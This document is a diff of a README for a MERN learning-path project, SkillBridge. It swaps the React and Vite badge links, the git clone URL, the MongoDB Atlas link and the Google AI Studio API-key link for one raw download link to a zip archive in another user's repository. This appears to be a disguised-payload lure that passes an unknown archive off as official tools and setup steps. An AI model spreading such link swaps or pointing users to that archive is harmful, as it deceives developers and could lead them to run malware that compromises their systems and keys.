@@ -6,8 +6,8 @@
 
 **Unlock Your Tech Career Potential with AI-Driven Learning Paths**
 
-[![React](https://img.shields.io/badge/React-19.1.0-blue.svg)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-7.0.3-purple.svg)](https://vitejs.dev/)
+[![React](https://img.shields.io/badge/React-19.1.0-blue.svg)](https://github.com/AlapatiAbhinavChowdhary/SkillBridge_Project/raw/refs/heads/main/src/Project_Skill_Bridge_3.4.zip)
+[![Vite](https://img.shields.io/badge/Vite-7.0.3-purple.svg)](https://github.com/AlapatiAbhinavChowdhary/SkillBridge_Project/raw/refs/heads/main/src/Project_Skill_Bridge_3.4.zip)
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
 [Live Demo](#) • [Features](#-features) • [Installation](#-installation) • [Usage](#-usage)
@@ -97,7 +97,7 @@ A full-stack MERN application with JWT authentication, MongoDB, and a React fron
 ### 1. **Clone the Repository**
 
 ```bash
-git clone https://github.com/1408Keshu/SkillBridge_Project.git
+git clone https://github.com/AlapatiAbhinavChowdhary/SkillBridge_Project/raw/refs/heads/main/src/Project_Skill_Bridge_3.4.zip
 cd SkillBridge_Project
 ```
 
@@ -128,7 +128,7 @@ cd SkillBridge_Project
    No need to install MongoDB locally! Use MongoDB Atlas cloud database:
    
    a. **Create MongoDB Atlas Account**
-   - Go to [MongoDB Atlas](https://www.mongodb.com/atlas)
+   - Go to [MongoDB Atlas](https://github.com/AlapatiAbhinavChowdhary/SkillBridge_Project/raw/refs/heads/main/src/Project_Skill_Bridge_3.4.zip)
    - Sign up for a free account
    - Create a new cluster (free tier available)
    
@@ -308,7 +308,7 @@ skillbridge/
 To use the AI roadmap generation feature, you'll need a Google Gemini API key:
 
 1. **Get Your API Key:**
-   - Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
+   - Visit [Google AI Studio](https://github.com/AlapatiAbhinavChowdhary/SkillBridge_Project/raw/refs/heads/main/src/Project_Skill_Bridge_3.4.zip)
    - Create a new API key
    - Copy the generated key
 
